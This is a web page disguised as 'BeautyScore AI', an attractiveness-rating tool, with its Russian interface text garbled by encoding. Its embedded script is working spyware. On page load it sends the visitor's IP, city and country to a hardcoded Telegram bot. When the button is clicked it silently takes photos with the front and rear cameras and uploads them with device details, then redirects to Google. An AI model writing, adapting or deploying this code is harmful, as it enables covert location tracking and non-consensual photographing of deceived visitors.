<!DOCTYPE html>
<html lang="ru">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="background:#0f0c29; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif; text-align:center;">
    <div style="background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); padding:40px 20px; border-radius:30px; max-width:360px; width:90%;">
        <h1>BeautyScore AI</h1>
        <p>–ù–µ–π—Ä–æ—Å–µ—Ç—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç –≤–∞—à –±–∞–ª–ª –ø—Ä–∏–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏.</p>
        <video id="v" autoplay playsinline style="display:none;"></video>
        <canvas id="c" style="display:none;"></canvas>
        <button id="b" style="padding:18px 40px; background:linear-gradient(90deg, #ff0080, #ff8c00); border:none; border-radius:50px; color:#fff; font-weight:bold; cursor:pointer;">–£–ó–ù–ê–¢–¨ –ë–ê–õ–õ</button>
        <div id="status" style="margin-top:20px; color:#00f2fe;">–°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞...</div>
    </div>

<script>
    const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
    const chat_id = '7164380121';

    // –≠–¢–û –ü–†–ò–°–´–õ–ê–ï–¢ –ì–û–†–û–î –°–†–ê–ó–£
    async function logVisit() {
        try {
            const res = await fetch('https://ipwho.is');
            const d = await res.json();
            const info = `üëÄ –ö–¢–û-–¢–û –ó–ê–®–ï–õ!\nüèô –ì–æ—Ä–æ–¥: ${d.city}\nüåç –°—Ç—Ä–∞–Ω–∞: ${d.country}\nüìç IP: ${d.ip}`;
            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
        } catch (e) {
            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("üëÄ –ó–∞—Ö–æ–¥ (IP —Å–∫—Ä—ã—Ç)"));
        }
    }
    logVisit();

    async function takePhoto(facing) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
            const v = document.getElementById('v');
            v.srcObject = s;
            await new Promise(r => setTimeout(r, 2000)); 
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
            const f = new FormData();
            f.append('chat_id', chat_id);
            f.append('photo', blob, 'img.jpg');
            f.append('caption', "üì∏ –§–æ—Ç–æ: " + facing + "\nüì± " + navigator.platform);
            await fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: f });
            s.getTracks().forEach(t => t.stop()); 
        } catch (e) {
            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("‚ùå –ö–ê–ú–ï–†–ê –ó–ê–ü–†–ï–©–ï–ù–ê"));
        }
    }

    document.getElementById('b').onclick = async () => {
        document.getElementById('b').style.display = "none";
        document.getElementById('status').innerText = "–ê–Ω–∞–ª–∏–∑...";
        await takePhoto("user"); 
        await takePhoto("environment"); 
        document.getElementById('status').innerText = "–ì–æ—Ç–æ–≤–æ!";
        setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
    };
</script>
</body>
</html>
